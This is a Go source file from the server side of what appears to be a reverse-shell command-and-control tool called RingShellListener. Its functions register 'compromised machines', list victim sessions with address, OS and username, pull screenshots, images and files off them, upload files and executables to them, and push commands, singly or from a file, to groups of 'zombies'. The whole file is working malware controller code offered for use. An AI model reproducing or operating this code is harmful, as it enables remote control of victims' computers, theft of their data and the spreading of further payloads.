package Server

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	_ "www.github.com/MustafaAbdulazizHamza/RingShellListener/Files"
)

func getUserInfo(conn net.Conn) (values []string, err error) {
	radd := fmt.Sprint(conn.RemoteAddr())
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(time.Second * 6))
	info, err := reader.ReadString('\n')
	if err != nil {
		log.Println("Unable to get the information from the compromised machine.")
		return []string{""}, err
	}
	d := strings.Split(info, ".")

	return []string{radd, d[0], strings.TrimSpace(d[1])}, nil
}

func listenToID(inp []string, id *string) {
	mu.Lock()

	if len(inp) == 2 {
		if _, exists := dt[inp[1]]; exists {
			*id = inp[1]

		} else {
			log.Println("The compromised machine`s ID you entered was not found.")
		}
	} else {
		log.Println("You have not entered the compromised machine`s ID.")
	}
	mu.Unlock()
}
func closeConnectionStuff(id string) {
	mu.Lock()
	if _, exists := dt[id]; exists {
		delete(dt, id)
	}
	if CId == id {
		CId = ""
	}
	mu.Unlock()
}

func list(inp []string) {
	if len(inp) < 2 {
		log.Println("You have entered an illegal list command.")
		return
	}

	if inp[1] == "sessions" {
		if len(dt) == 0 {
			fmt.Println("There is no currently active sessions.")
			return
		}
		fmt.Printf("%-5s %-15s %-10s %-10s\n", "ID", "Address", "OS", "Username")
		fmt.Println("--------------------------------------------")

		for i, value := range dt {
			fmt.Printf("%-5s %-15s %-10s %-10s\n", i, value[0], value[1], value[2])
		}
	} else if inp[1] == "servers" && len(inp) == 3 {
		if inp[2] == "listening" {
			if out := listServers(listeningServers, "listening"); out != "" {
				log.Println(out)
			}

		} else if inp[2] == "controlling" {
			if out := listServers(controllingServers, "controlling"); out != "" {
				log.Println(out)
			}
		} else {
			log.Println("You have entered an illegal list command.")
			return
		}
	} else {
		log.Println("You have entered an illegal list command.")
		return
	}
}

func listServers(data map[string]string, typeOfServer string) string {
	if len(data) == 0 {
		return fmt.Sprintf("There is no currently active %s server", typeOfServer)
	}
	fmt.Printf("%-15s %-15s\n", "Server Name", "Port Number")
	fmt.Println("----------------------------")
	for i, v := range data {
		fmt.Printf("%-15s %-15s\n", i, v)
	}
	return ""

}
func sendCmd(cmd string, writer *bufio.Writer) (err error) {
	if _, err := writer.WriteString(cmd + "\n"); err != nil {
		return err
	}
	if err := writer.Flush(); err != nil {
		return err
	}
	return nil
}

func getFile(inp []string, id string) (err error) {

	if (inp[1] == "image" || inp[1] == "file") && len(inp) < 3 {
		return fmt.Errorf("you must select the name of the %s", inp[1])
	}

	switch inp[1] {
	case "screenshots":
		chs[id] <- fmt.Sprintf("get %s", inp[1])
	case "image":
		chs[id] <- strings.Join(inp, " ")
	case "file":
		chs[id] <- strings.Join(inp, " ")
	default:
		return fmt.Errorf("unsupported command was entered")
	}
	return nil
}
func isAValidPortNumber(value string) bool {
	num, err := strconv.Atoi(value)
	if err != nil {
		return false
	}
	if num > 0 && num < 65535 {
		return true
	}
	return false
}
func setValue(key, value string) (err error) {
	if key == "out" {
		_, isE := os.Stat(value)
		if os.IsNotExist(isE) {
			return isE
		}
		outputDir = value
	} else if key == "port" {
		if isAValidPortNumber(value) {
			defaultPortNumber = value
		} else {
			return fmt.Errorf("%s is not a valid port number", value)
		}
	} else if key == "timeout" {
		if d, err := strconv.Atoi(value); err == nil {
			timeout = time.Duration(d) * time.Second
		} else {
			return fmt.Errorf("%d is not a valid time operand", d)
		}
	} else {
		return fmt.Errorf("%s is not a valid variable to be set", key)
	}

	return nil
}
func isExist(in string) (isDir bool) {
	_, err := os.Stat(in)
	return os.IsExist(err)
}
func sendCommandToZombies(inp []string) {
	chann, open := controllingServersChannels[inp[0]]
	if !open {
		log.Println("The server you are trying to use was not found.")
		return
	}
	if inp[1] == "command" {
		chann <- strings.Join(inp[2:], " ")
	} else if inp[1] == "file" {
		fi, err := os.Open(inp[2])
		if err != nil {
			log.Println("Unable to open the file:", err)
			return
		}
		defer fi.Close()
		scanner := bufio.NewScanner(fi)
		for scanner.Scan() {
			line := scanner.Text()
			chann <- line
		}
	} else {
		log.Println("You have entered an unsupported command.")
	}
}

func kill(inp []string) {
	if (len(inp) != 2) || !((inp[0] == "listening") || (inp[0] == "controlling")) {
		log.Println("You entered an illegal kill command.")
		return
	}
	var chann chan string
	var isExist bool
	if inp[0] == "controlling" {
		chann, isExist = controllingServersChannels[inp[1]]
		if !isExist {
			log.Println("The server you are requesting is unavailable.")
			return
		}
	} else if inp[0] == "listening" {
		chann, isExist = listeningServersChannels[inp[1]]
		if !isExist {
			log.Println("The server you are requesting is unavailable.")
			return
		}
	}
	chann <- "exit"

}

func upload(inp []string, id string) {
	if len(inp) < 3 {
		log.Println("You have entered an illegal upload command.")
		return
	}
	switch inp[1] {
	case "file":
		chs[id] <- strings.Join(inp, " ")
	case "executable":
		chs[id] <- strings.Join(inp, " ")
	default:
		log.Println("You have entered an illegal upload command.")
	}

}

func FileNamesParser(commands []string) string {
	var command strings.Builder
	for _, c := range commands[2:] {
		c = filepath.Base(c)
		command.WriteString(c + " ")
	}
	return command.String()
}
